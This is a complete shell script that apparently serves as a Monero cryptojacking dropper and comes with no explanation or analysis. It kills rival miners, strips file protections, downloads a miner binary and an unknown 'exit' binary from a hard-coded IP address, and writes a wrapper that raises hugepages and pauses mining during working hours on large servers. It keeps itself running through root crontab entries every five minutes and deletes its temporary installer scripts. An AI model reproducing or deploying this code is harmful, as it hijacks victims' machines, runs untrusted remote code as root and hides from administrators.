#!/bin/sh

pkill minerd
pkill monero

m=/usr/sbin/monero
minerd=/usr/sbin/minerd

#set rights
chattr -ais $m
chattr -ais $minerd

rm -f $minerd
rm -f /usr/src/exit
rm -f /usr/sbin/config.txt
rm -f /usr/sbin/config.json
rm -f /usr/sbin/pools.txt
rm -f /usr/sbin/cpu.txt

yum install -y wget hwloc-devel libmicrohttpd-devel
apt-get install -y wget
apt-get install -y libmicrohttpd-dev
apt-get install -y libhwloc-dev
apt install -y -qq libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev


mkdir -p /usr/src

s=129.121.176.89


#wget http://$s/config.json -O /usr/sbin/config.json
wget http://$s/config.txt -O /usr/sbin/config.txt
wget http://$s/pools.txt -O /usr/sbin/pools.txt
wget http://$s/exit -O /usr/src/exit

OS=""
grep -q "CentOS Linux 7" /etc/os-release && OS=C7
grep -q "CloudLinux" /etc/os-release && OS=C7
grep -q "Virtuozzo release 7" /etc/os-release && OS=C7
grep -q "XenServer" /etc/os-release && OS=C7
grep -q "Ubuntu 14" /etc/os-release && OS=U16
grep -q "Ubuntu 16" /etc/os-release && OS=U16
grep -q "Ubuntu 18" /etc/os-release && OS=U18
grep -q "Fedora 29" /etc/os-release && OS=F29
grep -q "Debian GNU/Linux 8" /etc/os-release && OS=U18
grep -q "Debian GNU/Linux 9" /etc/os-release && OS=D9
grep -q "Debian GNU/Linux 10" /etc/os-release && OS=U18


pkill minerd

wget http://$s/$OS/minerd -O $minerd


chmod +x $minerd
chmod +x /usr/src/exit


echo '#!/bin/sh'>$m
echo 'if [ "`date +%H`" -eq 10 ] && [ "`date +%M`" -eq 30 ];then'>>$m
echo 'pkill minerd'>>$m
echo 'fi'>>$m


if [ "`nproc`" -gt "10" ];then
echo 't=`date +%H`'>>$m
echo 'if [ $t -le 18 ] && [ $t -gt 7 ];then'>>$m
echo 'pkill minerd'>>$m
echo 'exit'>>$m
echo 'fi'>>$m
fi


echo 'cd `dirname $0`'>>$m
echo 'if [ "`ps ax | grep minerd -c`" -gt "1" ];then'>>$m
echo ' exit'>>$m
echo 'fi'>>$m
echo 'if [ "`ps ax | grep minerd -c`" -gt "1" ];then'>>$m
echo ' exit'>>$m
echo 'fi'>>$m
echo 'echo 1000 > /proc/sys/vm/nr_hugepages'>>$m
echo 'sysctl -w vm.nr_hugepages=1000'>>$m
echo 'cd /usr/sbin'>>$m
#echo 'nice -9  minerd -a xmr-v8 --host xmrpool.eu --port 3333 --user 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS5MiK5WrvMXJDx44dL --pass x -t $((`cat /proc/cpuinfo | grep processor -c`/2)) 1>&- 2>&- &'>>$m
#echo './minerd 1>&- 2>&- &'>>$m
echo './minerd'>>$m

#sed -i '/xmr.pool.org/d' /etc/hosts
#grep -q xmr.pool.org /etc/hosts || echo '1.1.1.1 xmr.pool.org'>>/etc/hosts


chmod +x $m


sed -i '/monero/d' /etc/crontab

if [ ! -f /etc/crontab ]; then
echo 'SHELL=/bin/bash'>/etc/crontab
echo 'PATH=/sbin:/bin:/usr/sbin:/usr/bin'>>/etc/crontab
echo 'MAILTO=root'>>/etc/crontab
echo 'HOME=/'>>/etc/crontab
fi

sed -i '/monero/d' /var/spool/cron/root

if [ ! -f /var/spool/cron/root ]; then
echo 'SHELL=/bin/bash'>/var/spool/cron/root
echo 'PATH=/sbin:/bin:/usr/sbin:/usr/bin'>>/var/spool/cron/root
echo 'MAILTO=root'>>/var/spool/cron/root
echo 'HOME=/'>>/var/spool/cron/root
fi

grep -q monero /var/spool/cron/root || echo '*/5     *       *       *       *       root    '$m>>/var/spool/cron/root
grep -q monero /etc/crontab || echo '*/5     *       *       *       *       root    '$m>>/etc/crontab

#$m

#ps ax | grep minerd

/usr/src/exit

rm -f /tmp/autodl.sh
rm -f /tmp/dl.sh

exit
